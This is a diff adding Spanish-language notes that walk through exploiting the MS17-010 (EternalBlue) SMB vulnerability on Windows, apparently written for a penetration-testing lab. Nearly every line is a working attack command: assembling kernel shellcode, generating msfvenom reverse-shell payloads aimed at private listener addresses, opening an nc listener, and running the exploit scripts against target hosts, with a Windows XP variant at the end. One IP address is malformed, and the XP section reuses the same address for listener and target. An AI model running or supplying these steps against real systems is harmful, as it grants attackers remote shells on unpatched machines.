@@ -1,0 +1,48 @@
+1. clonar el repositorio https://github.com/worawit/MS17-010.
+
+2. Ensamblar el kernel para x64
+nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+
+3. Generar un payload .bin x64
+ msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.0.29 --platform windows -a x64 --format raw -o sc_x64_payload.bin
+ 
+4. Concentrar ambos archivos en uno solo
+ cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
+ 
+5. Ensamblar el kernel para x86
+ nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+ 
+6. Generar un payload .bin x86
+ msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=192.168.0.29 --platform windows -a x86 --format raw -o sc_x86_payload.bin
+ 
+7. Concentrar ambos archivos en uno solo
+ cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
+
+8. Combinar ambos archivos .bin en uno solo 
+ python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+ 
+9. poner a la escucha un nc en el puerto previamente programado
+nc -nvlp 4444
+
+10. Lanzar el ataque
+ python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin
+ 
+11. si no funciona, se debe cambiar la carga aumentando de 10 en 10 o 5 en 5 los valores.
+ python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 10
+  python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 20
+   python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 30
+    python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 40
+    
+    
+    
+=================================Para windows xp se debe hacer lo siguiente=======================
+
+1. verificar la integridad del exploit ejecutando 
+
+python send_and_execute.py 10.11.1.5 t.exe --> si el resultado es File Not found t.exe el exploit funciona.
+
+2. generar reverse code
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.5 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
+
+3. lanzar exploit con nc a la escucha 
+python send_and_execute.py 10.11.1..5 ms17-010.exe
